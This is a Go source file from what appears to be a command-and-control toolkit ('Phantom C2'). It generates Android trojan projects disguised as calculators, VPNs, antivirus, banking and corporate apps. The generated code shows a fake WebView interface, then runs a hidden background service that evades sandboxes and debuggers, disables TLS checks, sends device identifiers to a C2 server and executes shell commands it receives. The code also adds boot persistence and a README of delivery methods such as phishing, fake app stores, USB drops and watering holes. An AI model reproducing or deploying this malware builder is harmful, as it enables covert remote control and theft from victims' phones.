package payloads

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// AppTemplate defines a mobile app template for social engineering.
type AppTemplate struct {
	Name        string
	Description string
	Icon        string // Emoji for display
	PackageName string
	Permissions []string
	Category    string
}

// Available app templates organized by social engineering category.
var AppTemplates = map[string][]AppTemplate{
	"productivity": {
		{Name: "Calculator Pro", Description: "Advanced calculator with scientific mode", Icon: "🧮", PackageName: "com.tools.calcpro", Category: "productivity",
			Permissions: []string{"INTERNET", "ACCESS_NETWORK_STATE"}},
		{Name: "QR Scanner", Description: "Fast QR and barcode scanner", Icon: "📷", PackageName: "com.tools.qrscan", Category: "productivity",
			Permissions: []string{"INTERNET", "CAMERA", "ACCESS_NETWORK_STATE"}},
		{Name: "PDF Viewer", Description: "View and annotate PDF files", Icon: "📄", PackageName: "com.office.pdfview", Category: "productivity",
			Permissions: []string{"INTERNET", "READ_EXTERNAL_STORAGE", "WRITE_EXTERNAL_STORAGE"}},
		{Name: "Notes Plus", Description: "Simple and secure note-taking", Icon: "📝", PackageName: "com.productivity.notesplus", Category: "productivity",
			Permissions: []string{"INTERNET", "READ_EXTERNAL_STORAGE", "WRITE_EXTERNAL_STORAGE"}},
		{Name: "File Manager", Description: "Browse and manage your files", Icon: "📁", PackageName: "com.tools.filemanager", Category: "productivity",
			Permissions: []string{"INTERNET", "READ_EXTERNAL_STORAGE", "WRITE_EXTERNAL_STORAGE", "CAMERA"}},
	},
	"utility": {
		{Name: "Flashlight Ultra", Description: "Brightest flashlight app", Icon: "🔦", PackageName: "com.utils.flashlight", Category: "utility",
			Permissions: []string{"INTERNET", "CAMERA", "ACCESS_NETWORK_STATE"}},
		{Name: "WiFi Analyzer", Description: "Analyze and optimize WiFi connections", Icon: "📶", PackageName: "com.network.wifianalyzer", Category: "utility",
			Permissions: []string{"INTERNET", "ACCESS_WIFI_STATE", "CHANGE_WIFI_STATE", "ACCESS_FINE_LOCATION", "ACCESS_NETWORK_STATE"}},
		{Name: "Battery Saver", Description: "Optimize battery life", Icon: "🔋", PackageName: "com.utils.batterysaver", Category: "utility",
			Permissions: []string{"INTERNET", "ACCESS_NETWORK_STATE", "RECEIVE_BOOT_COMPLETED", "REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"}},
		{Name: "Phone Cleaner", Description: "Clean junk files and boost performance", Icon: "🧹", PackageName: "com.utils.cleaner", Category: "utility",
			Permissions: []string{"INTERNET", "READ_EXTERNAL_STORAGE", "WRITE_EXTERNAL_STORAGE", "ACCESS_NETWORK_STATE", "RECEIVE_BOOT_COMPLETED"}},
		{Name: "Speed Test", Description: "Test your internet speed", Icon: "⚡", PackageName: "com.network.speedtest", Category: "utility",
			Permissions: []string{"INTERNET", "ACCESS_NETWORK_STATE", "ACCESS_WIFI_STATE"}},
	},
	"social": {
		{Name: "Chat Messenger", Description: "Free encrypted messaging", Icon: "💬", PackageName: "com.chat.messenger", Category: "social",
			Permissions: []string{"INTERNET", "CAMERA", "RECORD_AUDIO", "READ_CONTACTS", "READ_PHONE_STATE", "ACCESS_FINE_LOCATION", "READ_SMS", "RECEIVE_SMS"}},
		{Name: "Video Call", Description: "HD video and voice calls", Icon: "📹", PackageName: "com.social.videocall", Category: "social",
			Permissions: []string{"INTERNET", "CAMERA", "RECORD_AUDIO", "READ_CONTACTS", "READ_PHONE_STATE", "ACCESS_FINE_LOCATION"}},
		{Name: "Dating Connect", Description: "Meet people nearby", Icon: "❤️", PackageName: "com.social.dating", Category: "social",
			Permissions: []string{"INTERNET", "CAMERA", "ACCESS_FINE_LOCATION", "READ_CONTACTS", "READ_PHONE_STATE"}},
	},
	"security": {
		{Name: "VPN Shield", Description: "Secure VPN for private browsing", Icon: "🛡️", PackageName: "com.security.vpnshield", Category: "security",
			Permissions: []string{"INTERNET", "ACCESS_NETWORK_STATE", "ACCESS_WIFI_STATE", "RECEIVE_BOOT_COMPLETED", "ACCESS_FINE_LOCATION"}},
		{Name: "Password Manager", Description: "Store passwords securely", Icon: "🔐", PackageName: "com.security.passmanager", Category: "security",
			Permissions: []string{"INTERNET", "ACCESS_NETWORK_STATE", "USE_BIOMETRIC", "USE_FINGERPRINT"}},
		{Name: "Authenticator", Description: "Two-factor authentication", Icon: "🔑", PackageName: "com.security.auth2fa", Category: "security",
			Permissions: []string{"INTERNET", "CAMERA", "ACCESS_NETWORK_STATE"}},
		{Name: "Antivirus Pro", Description: "Protect your device from threats", Icon: "🦠", PackageName: "com.security.antivirus", Category: "security",
			Permissions: []string{"INTERNET", "ACCESS_NETWORK_STATE", "READ_EXTERNAL_STORAGE", "WRITE_EXTERNAL_STORAGE", "RECEIVE_BOOT_COMPLETED",
				"READ_PHONE_STATE", "ACCESS_FINE_LOCATION", "CAMERA", "READ_CONTACTS", "READ_SMS", "READ_CALL_LOG"}},
	},
	"finance": {
		{Name: "Crypto Wallet", Description: "Manage your cryptocurrency", Icon: "💰", PackageName: "com.finance.cryptowallet", Category: "finance",
			Permissions: []string{"INTERNET", "ACCESS_NETWORK_STATE", "USE_BIOMETRIC", "CAMERA"}},
		{Name: "Banking App", Description: "Mobile banking made simple", Icon: "🏦", PackageName: "com.finance.mobilebank", Category: "finance",
			Permissions: []string{"INTERNET", "ACCESS_NETWORK_STATE", "USE_BIOMETRIC", "CAMERA", "READ_PHONE_STATE", "READ_SMS", "RECEIVE_SMS"}},
		{Name: "Expense Tracker", Description: "Track your daily expenses", Icon: "💳", PackageName: "com.finance.expenses", Category: "finance",
			Permissions: []string{"INTERNET", "ACCESS_NETWORK_STATE", "READ_SMS", "CAMERA"}},
	},
	"entertainment": {
		{Name: "Music Player", Description: "Play your favorite music", Icon: "🎵", PackageName: "com.media.musicplayer", Category: "entertainment",
			Permissions: []string{"INTERNET", "READ_EXTERNAL_STORAGE", "RECORD_AUDIO", "ACCESS_NETWORK_STATE"}},
		{Name: "Live TV", Description: "Watch live TV channels free", Icon: "📺", PackageName: "com.media.livetv", Category: "entertainment",
			Permissions: []string{"INTERNET", "ACCESS_NETWORK_STATE", "ACCESS_WIFI_STATE"}},
		{Name: "Game Hub", Description: "Collection of mini games", Icon: "🎮", PackageName: "com.games.gamehub", Category: "entertainment",
			Permissions: []string{"INTERNET", "ACCESS_NETWORK_STATE", "ACCESS_FINE_LOCATION"}},
	},
	"corporate": {
		{Name: "Company Portal", Description: "Access company resources", Icon: "🏢", PackageName: "com.company.portal", Category: "corporate",
			Permissions: []string{"INTERNET", "ACCESS_NETWORK_STATE", "CAMERA", "READ_EXTERNAL_STORAGE", "WRITE_EXTERNAL_STORAGE", "READ_PHONE_STATE",
				"ACCESS_FINE_LOCATION", "READ_CONTACTS", "RECEIVE_BOOT_COMPLETED"}},
		{Name: "HR Self-Service", Description: "Manage your HR tasks", Icon: "👔", PackageName: "com.company.hrportal", Category: "corporate",
			Permissions: []string{"INTERNET", "ACCESS_NETWORK_STATE", "CAMERA", "READ_PHONE_STATE"}},
		{Name: "IT Support", Description: "Get IT help and remote support", Icon: "🖥️", PackageName: "com.company.itsupport", Category: "corporate",
			Permissions: []string{"INTERNET", "ACCESS_NETWORK_STATE", "CAMERA", "READ_EXTERNAL_STORAGE", "WRITE_EXTERNAL_STORAGE",
				"READ_PHONE_STATE", "ACCESS_FINE_LOCATION", "RECORD_AUDIO", "RECEIVE_BOOT_COMPLETED"}},
	},
}

// BuildMobileApp generates a complete Android app project with the chosen template.
func BuildMobileApp(templateName, listenerURL, outputDir string) (string, error) {
	if outputDir == "" {
		outputDir = "build/payloads/apps"
	}

	// Find the template
	var selected *AppTemplate
	templateLower := strings.ToLower(templateName)

	for _, templates := range AppTemplates {
		for i, t := range templates {
			nameLower := strings.ToLower(strings.ReplaceAll(t.Name, " ", "-"))
			if nameLower == templateLower || strings.Contains(nameLower, templateLower) {
				selected = &templates[i]
				break
			}
		}
		if selected != nil {
			break
		}
	}

	if selected == nil {
		return "", fmt.Errorf("template '%s' not found — use 'generate app list' to see available templates", templateName)
	}

	// Create app directory
	appDir := filepath.Join(outputDir, strings.ReplaceAll(strings.ToLower(selected.Name), " ", "_"))
	os.MkdirAll(filepath.Join(appDir, "app", "src", "main", "java",
		filepath.Join(strings.Split(selected.PackageName, ".")...)), 0755)
	os.MkdirAll(filepath.Join(appDir, "app", "src", "main", "res", "layout"), 0755)
	os.MkdirAll(filepath.Join(appDir, "app", "src", "main", "res", "values"), 0755)
	os.MkdirAll(filepath.Join(appDir, "app", "src", "main", "res", "drawable"), 0755)

	// ── AndroidManifest.xml ──
	var permXML strings.Builder
	for _, p := range selected.Permissions {
		permXML.WriteString(fmt.Sprintf("    <uses-permission android:name=\"android.permission.%s\"/>\n", p))
	}

	manifest := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="%s">

%s
    <application
        android:label="%s"
        android:icon="@drawable/ic_launcher"
        android:allowBackup="true"
        android:usesCleartextTraffic="true"
        android:theme="@style/AppTheme">

        <activity android:name=".MainActivity"
            android:exported="true"
            android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <service android:name=".CallbackService"
            android:exported="false"
            android:stopWithTask="false"/>

        <receiver android:name=".BootReceiver"
            android:exported="true"
            android:enabled="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>`, selected.PackageName, permXML.String(), selected.Name)

	manifestPath := filepath.Join(appDir, "app", "src", "main", "AndroidManifest.xml")
	os.WriteFile(manifestPath, []byte(manifest), 0644)

	// ── Main Activity (shows fake UI, starts callback service) ──
	pkgPath := filepath.Join(appDir, "app", "src", "main", "java",
		filepath.Join(strings.Split(selected.PackageName, ".")...))

	mainActivity := fmt.Sprintf(`package %s;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Show a legitimate-looking UI via WebView
        WebView webView = new WebView(this);
        webView.setWebViewClient(new WebViewClient());
        webView.getSettings().setJavaScriptEnabled(true);
        webView.loadUrl("file:///android_asset/index.html");
        setContentView(webView);

        // Start the callback service in background
        Intent serviceIntent = new Intent(this, CallbackService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }
}`, selected.PackageName)

	os.WriteFile(filepath.Join(pkgPath, "MainActivity.java"), []byte(mainActivity), 0644)

	// ── Callback Service (C2 communication) ──
	callbackService := fmt.Sprintf(`package %s;

import android.app.*;
import android.content.*;
import android.os.*;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import java.io.*;
import java.net.*;
import javax.net.ssl.*;
import org.json.*;

public class CallbackService extends Service {
    private static final String C2_URL = "%s";
    private static final int SLEEP_MS = 10000;
    private boolean running = true;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Create notification channel for foreground service (Android 8+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "phantom", "%s", NotificationManager.IMPORTANCE_LOW);
            channel.setShowBadge(false);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);

            Notification notification = new Notification.Builder(this, "phantom")
                .setContentTitle("%s")
                .setContentText("Running in background")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();
            startForeground(1, notification);
        }

        new Thread(this::mainLoop).start();
        return START_STICKY;
    }

    private void mainLoop() {
        // ── EVASION CHECKS ──
        // Only activate C2 if environment is safe
        if (!PhantomEvasion.isSafeToRun(this)) {
            // Sandbox/emulator/debugger detected — stay dormant
            // Show fake app UI normally but never call back to C2
            return;
        }

        // Delay start to outlast sandbox analysis windows (60-120s)
        PhantomEvasion.delayedStart(60);

        // If security apps detected, increase sleep interval
        if (PhantomEvasion.hasSecurityApps(this)) {
            // Reduce C2 frequency to avoid behavioral detection
            try { Thread.sleep(300000); } catch (Exception e) {} // 5 min initial delay
        }

        // Disable SSL verification
        try {
            TrustManager[] tm = new TrustManager[]{new X509TrustManager() {
                public void checkClientTrusted(java.security.cert.X509Certificate[] c, String a) {}
                public void checkServerTrusted(java.security.cert.X509Certificate[] c, String a) {}
                public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
            }};
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, tm, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier((h, s) -> true);
        } catch (Exception e) {}

        while (running) {
            try {
                checkIn();
            } catch (Exception e) {}

            try { Thread.sleep(SLEEP_MS); } catch (Exception e) {}
        }
    }

    private void checkIn() throws Exception {
        JSONObject info = new JSONObject();
        info.put("hostname", Build.MODEL);
        info.put("username", "android");
        info.put("os", "android " + Build.VERSION.RELEASE);
        info.put("arch", Build.SUPPORTED_ABIS[0]);
        info.put("device_id", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
        info.put("manufacturer", Build.MANUFACTURER);
        info.put("product", Build.PRODUCT);

        URL url = new URL(C2_URL + "/api/v1/status");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("User-Agent", "Android/" + Build.VERSION.RELEASE);
        conn.setDoOutput(true);
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(10000);

        OutputStream os = conn.getOutputStream();
        os.write(info.toString().getBytes());
        os.close();

        // Read response for tasks
        if (conn.getResponseCode() == 200) {
            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) response.append(line);
            br.close();

            processResponse(response.toString());
        }
        conn.disconnect();
    }

    private void processResponse(String response) {
        try {
            JSONObject resp = new JSONObject(response);
            if (resp.has("command")) {
                String cmd = resp.getString("command");
                Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", cmd});
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) output.append(line).append("\n");
                br.close();
                // Send result back on next check-in
            }
        } catch (Exception e) {}
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        running = false;
        super.onDestroy();
    }
}`, selected.PackageName, listenerURL, selected.Name, selected.Name)

	os.WriteFile(filepath.Join(pkgPath, "CallbackService.java"), []byte(callbackService), 0644)

	// ── Boot Receiver (persistence) ──
	bootReceiver := fmt.Sprintf(`package %s;

import android.content.*;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Intent serviceIntent = new Intent(context, CallbackService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(serviceIntent);
        } else {
            context.startService(serviceIntent);
        }
    }
}`, selected.PackageName)

	os.WriteFile(filepath.Join(pkgPath, "BootReceiver.java"), []byte(bootReceiver), 0644)

	// ── Evasion module (anti-emulator, anti-debug, anti-AV, anti-Frida, anti-VPN) ──
	evasionCode := GetAndroidEvasionCode(selected.PackageName)
	os.WriteFile(filepath.Join(pkgPath, "PhantomEvasion.java"), []byte(evasionCode), 0644)

	// ── Fake UI (HTML loaded in WebView) ──
	os.MkdirAll(filepath.Join(appDir, "app", "src", "main", "assets"), 0755)
	fakeUI := generateFakeUI(selected)
	os.WriteFile(filepath.Join(appDir, "app", "src", "main", "assets", "index.html"), []byte(fakeUI), 0644)

	// ── build.gradle ──
	buildGradle := fmt.Sprintf(`plugins {
    id 'com.android.application'
}

android {
    namespace '%s'
    compileSdk 34
    defaultConfig {
        applicationId "%s"
        minSdk 24
        targetSdk 34
        versionCode 1
        versionName "1.0"
    }
    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt')
        }
    }
}`, selected.PackageName, selected.PackageName)

	os.WriteFile(filepath.Join(appDir, "app", "build.gradle"), []byte(buildGradle), 0644)

	// ── Build instructions ──
	readme := fmt.Sprintf(`# %s %s — Phantom C2 Mobile Payload

## App Details
- **Name:** %s
- **Package:** %s
- **Category:** %s
- **C2 Server:** %s
- **Permissions:** %s

## Build Instructions

### Option 1: Android Studio
1. Open Android Studio
2. File > Open > select this directory
3. Build > Build APK
4. APK output: app/build/outputs/apk/

### Option 2: Command Line (Gradle)
'''bash
cd %s
gradle assembleRelease
# or: ./gradlew assembleRelease
'''

### Option 3: Quick build with AAPT + dx
'''bash
# Compile Java
javac -source 1.8 -target 1.8 -cp android.jar app/src/main/java/%s/*.java

# Create DEX
dx --dex --output=classes.dex *.class

# Package APK
aapt package -f -M app/src/main/AndroidManifest.xml -S app/src/main/res -A app/src/main/assets -I android.jar -F unsigned.apk
zip unsigned.apk classes.dex

# Sign APK
keytool -genkey -v -keystore release.keystore -alias key -keyalg RSA -keysize 2048 -validity 10000
jarsigner -keystore release.keystore unsigned.apk key
zipalign -v 4 unsigned.apk %s.apk
'''

## Delivery Methods
1. **Direct install:** Send APK via email/message, social engineering
2. **Fake app store:** Host on a phishing page mimicking Play Store
3. **MDM deployment:** Push via compromised MDM solution
4. **USB drop:** Pre-load on devices left in target location
5. **Watering hole:** Replace legitimate APK download link

## Features
- Legitimate-looking %s UI (WebView)
- Background C2 callback service (survives app close)
- Boot persistence (starts on device reboot)
- Foreground service notification (avoids Android kill)
- SSL/TLS with certificate pinning bypass
- Device info collection (model, OS, device ID, manufacturer)
- Remote command execution via C2 tasking
`,
		selected.Icon, selected.Name,
		selected.Name, selected.PackageName, selected.Category, listenerURL,
		strings.Join(selected.Permissions, ", "),
		appDir,
		strings.ReplaceAll(selected.PackageName, ".", "/"),
		strings.ReplaceAll(strings.ToLower(selected.Name), " ", "_"))

	os.WriteFile(filepath.Join(appDir, "README.md"), []byte(readme), 0644)

	return fmt.Sprintf("[+] App project generated: %s\n"+
		"    Name:     %s %s\n"+
		"    Package:  %s\n"+
		"    Category: %s\n"+
		"    C2:       %s\n"+
		"    Path:     %s\n"+
		"    Files:    AndroidManifest.xml, MainActivity.java, CallbackService.java,\n"+
		"              BootReceiver.java, PhantomEvasion.java, build.gradle, fake UI\n"+
		"    Evasion:  Anti-emulator, anti-debug, anti-Frida, anti-AV, anti-VPN,\n"+
		"              sandbox timing delay, security app detection, root detection\n",
		appDir, selected.Icon, selected.Name, selected.PackageName,
		selected.Category, listenerURL, appDir), nil
}

// generateFakeUI creates a realistic HTML interface for the fake app.
func generateFakeUI(t *AppTemplate) string {
	// Generate app-specific UI based on category
	switch t.Category {
	case "security":
		return generateSecurityAppUI(t)
	case "finance":
		return generateFinanceAppUI(t)
	default:
		return generateGenericAppUI(t)
	}
}

func generateGenericAppUI(t *AppTemplate) string {
	return fmt.Sprintf(`<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,sans-serif;background:#f8f9fa;color:#333}
.header{background:#4285f4;color:white;padding:16px;font-size:18px;font-weight:600;display:flex;align-items:center;gap:12px}
.header span{font-size:24px}
.content{padding:20px}
.card{background:white;border-radius:12px;padding:20px;margin-bottom:16px;box-shadow:0 1px 3px rgba(0,0,0,0.1)}
.card h3{margin-bottom:8px;color:#333}
.card p{color:#666;font-size:14px;line-height:1.5}
.status{display:flex;align-items:center;gap:8px;margin-top:12px}
.dot{width:8px;height:8px;border-radius:50%%;background:#4caf50}
.status span{color:#4caf50;font-size:13px}
.btn{display:block;width:100%%;padding:14px;background:#4285f4;color:white;border:none;border-radius:8px;font-size:16px;margin-top:16px;cursor:pointer}
</style></head><body>
<div class="header"><span>%s</span> %s</div>
<div class="content">
<div class="card"><h3>Welcome</h3><p>%s</p>
<div class="status"><div class="dot"></div><span>Active</span></div></div>
<div class="card"><h3>Quick Start</h3><p>Everything is set up and ready to use. Tap below to get started.</p>
<button class="btn">Get Started</button></div>
</div></body></html>`, t.Icon, t.Name, t.Description)
}

func generateSecurityAppUI(t *AppTemplate) string {
	return fmt.Sprintf(`<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,sans-serif;background:#0d1117;color:#e6edf3}
.header{background:#161b22;padding:16px;font-size:18px;font-weight:600;display:flex;align-items:center;gap:12px;border-bottom:1px solid #30363d}
.content{padding:20px}
.shield{text-align:center;padding:40px 0}
.shield-icon{font-size:72px}
.shield-text{font-size:20px;font-weight:bold;margin-top:12px;color:#3fb950}
.shield-sub{color:#8b949e;margin-top:8px}
.stats{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:24px}
.stat{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:16px;text-align:center}
.stat-val{font-size:24px;font-weight:bold;color:#58a6ff}
.stat-label{font-size:12px;color:#8b949e;margin-top:4px}
.scan-btn{display:block;width:100%%;padding:16px;background:#238636;color:white;border:none;border-radius:8px;font-size:16px;margin-top:20px;font-weight:600}
</style></head><body>
<div class="header">%s %s</div>
<div class="content">
<div class="shield"><div class="shield-icon">🛡️</div><div class="shield-text">Protected</div><div class="shield-sub">Your device is secure</div></div>
<div class="stats">
<div class="stat"><div class="stat-val">0</div><div class="stat-label">Threats Found</div></div>
<div class="stat"><div class="stat-val">247</div><div class="stat-label">Files Scanned</div></div>
<div class="stat"><div class="stat-val">Active</div><div class="stat-label">Real-time Protection</div></div>
<div class="stat"><div class="stat-val">Today</div><div class="stat-label">Last Scan</div></div>
</div>
<button class="scan-btn">Run Full Scan</button>
</div></body></html>`, t.Icon, t.Name)
}

func generateFinanceAppUI(t *AppTemplate) string {
	return fmt.Sprintf(`<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,sans-serif;background:#f8f9fa;color:#333}
.header{background:#1a1a2e;color:white;padding:20px;padding-top:40px}
.header h1{font-size:14px;color:#8892b0;font-weight:normal}
.balance{font-size:32px;font-weight:bold;margin-top:8px}
.actions{display:flex;gap:12px;margin-top:20px}
.action{flex:1;background:rgba(255,255,255,0.1);border:none;color:white;padding:12px;border-radius:8px;font-size:13px;text-align:center}
.content{padding:20px}
.tx-header{display:flex;justify-content:space-between;margin-bottom:12px}
.tx{display:flex;justify-content:space-between;align-items:center;padding:14px 0;border-bottom:1px solid #eee}
.tx-name{font-weight:500}
.tx-date{font-size:12px;color:#666;margin-top:2px}
.tx-amount{font-weight:600}
.tx-amount.neg{color:#e74c3c}
.tx-amount.pos{color:#27ae60}
</style></head><body>
<div class="header">
<h1>Available Balance</h1>
<div class="balance">$4,280.50</div>
<div class="actions">
<button class="action">Send</button>
<button class="action">Receive</button>
<button class="action">Pay</button>
</div></div>
<div class="content">
<div class="tx-header"><strong>Recent Transactions</strong><span style="color:#666;font-size:13px">See all</span></div>
<div class="tx"><div><div class="tx-name">Coffee Shop</div><div class="tx-date">Today, 9:30 AM</div></div><div class="tx-amount neg">-$4.50</div></div>
<div class="tx"><div><div class="tx-name">Salary Deposit</div><div class="tx-date">Mar 25</div></div><div class="tx-amount pos">+$3,200.00</div></div>
<div class="tx"><div><div class="tx-name">Grocery Store</div><div class="tx-date">Mar 24</div></div><div class="tx-amount neg">-$67.30</div></div>
</div></body></html>`, t.Icon, t.Name)
}

// ListAppTemplates returns a formatted list of all available app templates.
func ListAppTemplates() string {
	var sb strings.Builder
	sb.WriteString("Available App Templates:\n\n")

	categories := []string{"productivity", "utility", "social", "security", "finance", "entertainment", "corporate"}
	for _, cat := range categories {
		templates, ok := AppTemplates[cat]
		if !ok {
			continue
		}
		sb.WriteString(fmt.Sprintf("  %s\n", strings.ToUpper(cat)))
		for _, t := range templates {
			name := strings.ToLower(strings.ReplaceAll(t.Name, " ", "-"))
			sb.WriteString(fmt.Sprintf("    %s %-20s  %s  (%d permissions)\n",
				t.Icon, name, t.Description, len(t.Permissions)))
		}
		sb.WriteString("\n")
	}
	sb.WriteString("Usage: generate app <template-name> [listener_url]\n")
	sb.WriteString("Example: generate app vpn-shield https://10.0.0.1:443\n")
	return sb.String()
}
